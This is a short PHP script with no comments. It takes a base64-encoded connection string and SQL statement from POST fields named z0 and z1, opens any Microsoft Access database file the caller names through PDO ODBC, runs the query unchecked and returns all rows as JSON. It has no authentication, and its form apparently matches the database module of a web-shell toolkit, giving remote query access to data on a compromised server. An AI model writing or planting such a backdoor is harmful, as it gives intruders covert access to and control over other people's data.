<?php

header('Content-Type: application/json');

$conn_str = base64_decode($_POST['z0']);
$sql = base64_decode($_POST['z1']);

function parse_conn($str) {
    $out = [];

    foreach (explode(';', $str) as $p) {
        if (strpos($p, '=') !== false) {
            [$k, $v] = explode('=', $p, 2);
            $out[trim($k)] = trim($v);
        }
    }

    return $out;
}

try {

    if (!extension_loaded('pdo_odbc'))
        throw new Exception('Cannot find module "pdo_odbc"');

    $cfg = parse_conn($conn_str);
    $driver = $cfg['Driver'] ?? '{Microsoft Access Driver (*.mdb, *.accdb)}';
    $db = $cfg['Dbq'] ?? $cfg['Database'] ?? $cfg['Data Source'] ?? '';
    $password = $cfg['PWD'] ?? $cfg['Password'] ?? '';

    if (!$db)
        throw new Exception('Access database path missing');

    if (!file_exists($db))
        throw new Exception('Access database file not found: ' . $db);


    $dsn = "odbc:" . "Driver=" . $driver . ";" . "Dbq=" . $db . ";";

    if ($password !== '') {
        $dsn .= "PWD=" . $password . ";";
    }

    $pdo = new PDO($dsn);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if (!$sql) {
        echo json_encode([
            'success' => true,
            'message' => 'Access database connection is OK'
        ]);

        exit;
    }

    $stmt = $pdo->query($sql);
    $rows = [];

    if ($stmt->columnCount() > 0) {
        while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
            $rows[] = $row;
        }
    }

    echo json_encode([
        'success' => true,
        'rowCount' => count($rows),
        'data' => $rows
    ]);

    $pdo = null;

} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}

?>